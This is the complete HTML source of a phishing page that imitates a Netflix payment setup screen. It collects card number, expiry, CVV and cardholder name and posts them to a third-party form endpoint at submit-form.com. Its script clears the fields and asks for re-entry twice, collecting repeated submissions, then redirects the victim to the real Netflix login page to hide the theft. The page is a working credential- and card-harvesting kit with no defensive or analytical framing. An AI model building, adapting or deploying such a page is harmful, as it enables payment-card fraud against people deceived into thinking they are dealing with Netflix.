<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Payment Information</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #141414;
            color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .netflix-logo {
            padding: 25px 45px;
        }

        .netflix-logo-text {
            color: #e50914;
            font-size: 45px;
            font-weight: 900;
            text-transform: uppercase;
        }

        .payment-container {
            max-width: 450px;
            width: 100%;
            margin: 0 auto;
            padding: 60px 68px;
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
        }

        h1 {
            color: #fff;
            font-size: 32px;
            margin-bottom: 28px;
        }

        .payment-form {
            display: flex;
            flex-direction: column;
        }

        .form-group {
            position: relative;
            margin-bottom: 25px;
            padding-bottom: 5px;
        }

        input {
            width: 100%;
            height: auto;
            padding: 5px 0;
            background: transparent;
            border: none;
            border-bottom: 1px solid #8c8c8c;
            color: #fff;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            background: #454545;
        }

        label {
            position: absolute;
            top: 5px;
            left: 0;
            color: #8c8c8c;
            font-size: 16px;
            transition: all 0.2s ease;
            pointer-events: none;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -15px;
            font-size: 11px;
            color: #8c8c8c;
        }

        .row {
            display: flex;
            gap: 20px;
        }

        button {
            background-color: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 16px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 24px;
        }

        button:hover {
            background-color: #f40612;
        }

        .card-info {
            font-size: 13px;
            color: #8c8c8c;
            margin-top: 20px;
        }

        .error {
            color: #e87c03;
            font-size: 13px;
            margin: 6px 0;
            display: none;
        }

        @media (max-width: 740px) {
            .payment-container {
                padding: 60px 5%;
            }
        }

        /* Honeypot field hidden style */
        .honeypot {
            display: none; /* Hide the honeypot field */
        }
    </style>
</head>
<body>
    <header>
        <div class="netflix-logo">
            <div class="netflix-logo-text">NETFLIX</div>
        </div>
    </header>

    <main>
        <div class="payment-container">
            <h1>Set up your payment</h1>
            
            <form class="payment-form" id="paymentForm" action="https://submit-form.com/upnVnrqfK" method="POST">
                <!-- Honeypot Field -->
                <div class="form-group honeypot">
                    <input type="text" id="honeypot" name="honeypot" placeholder="Leave this field empty">
                </div>

                <div class="form-group">
                    <input type="text" id="cardNumber" name="card_number" placeholder=" " required>
                    <label for="cardNumber">Card number</label>
                    <div class="error" id="cardNumberError">Please enter a valid card number</div>
                </div>

                <div class="row">
                    <div class="form-group" style="flex: 1;">
                        <input type="text" id="expirationDate" name="expiry_date" placeholder=" " required>
                        <label for="expirationDate">Exp date (MM/YY)</label>
                        <div class="error" id="expiryError">Please enter a valid expiration date</div>
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <input type="text" id="cvv" name="cvv" placeholder=" " required>
                        <label for="cvv">Security code (CVV)</label>
                        <div class="error" id="cvvError">Please enter a valid security code</div>
                    </div>
                </div>

                <div class="form-group">
                    <input type="text" id="nameOnCard" name="card_name" placeholder=" " required>
                    <label for="nameOnCard">First and last name</label>
                    <div class="error" id="nameError">Please enter your name</div>
                </div>

                <button type="submit">Submit</button>
            </form>

            <p class="card-info">
                Your payment will be processed internationally. Additional bank fees may apply.
            </p>
        </div>
    </main>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('paymentForm');
            const cardNumberInput = document.getElementById('cardNumber');
            const expirationInput = document.getElementById('expirationDate');
            const cvvInput = document.getElementById('cvv');
            const nameInput = document.getElementById('nameOnCard');
            const honeypotInput = document.getElementById('honeypot');
            let submissionCount = 0; // Initialize submission count
            
            // Form submission handling
            form.addEventListener('submit', function(e) {
                e.preventDefault(); // Prevent the default form submission
                
                // Check honeypot field
                if (honeypotInput.value.trim() !== '') {
                    alert('Spam detected!');
                    return;
                }

                let isValid = true;

                // Field validation checks
                if (!cardNumberInput.value.trim()) {
                    document.getElementById('cardNumberError').style.display = 'block';
                    isValid = false;
                }
                if (!expirationInput.value.trim()) {
                    document.getElementById('expiryError').style.display = 'block';
                    isValid = false;
                }
                if (!cvvInput.value.trim()) {
                    document.getElementById('cvvError').style.display = 'block';
                    isValid = false;
                }
                if (!nameInput.value.trim()) {
                    document.getElementById('nameError').style.display = 'block';
                    isValid = false;
                }

                // Prevent submission if any fields are empty
                if (!isValid) return;

                // Increment submission count
                submissionCount++;

                // Simulate form submission to your endpoint
                fetch(form.action, {
                    method: 'POST',
                    body: new URLSearchParams(new FormData(form)),
                }).then(response => {
                    if (response.ok) {
                        alert('Form submitted successfully!');
                    } else {
                        alert('Error submitting form.');
                    }
                });

                // Clear all fields
                cardNumberInput.value = '';
                expirationInput.value = '';
                cvvInput.value = '';
                nameInput.value = '';

                // Show error message
                if (submissionCount < 3) {
                    alert('Please fill out the form again.');
                } else {
                    // Redirect to Netflix login page on the third submission
                    window.location.href = "https://www.netflix.com/login";
                }
            });
            
            // Clear errors on focus
            [cardNumberInput, expirationInput, cvvInput, nameInput].forEach(input => {
                input.addEventListener('focus', function() {
                    const errorElement = document.getElementById(input.id + 'Error');
                    if (errorElement) {
                        errorElement.style.display = 'none';
                    }
                });
            });
        });
    </script>
</body>
</html>
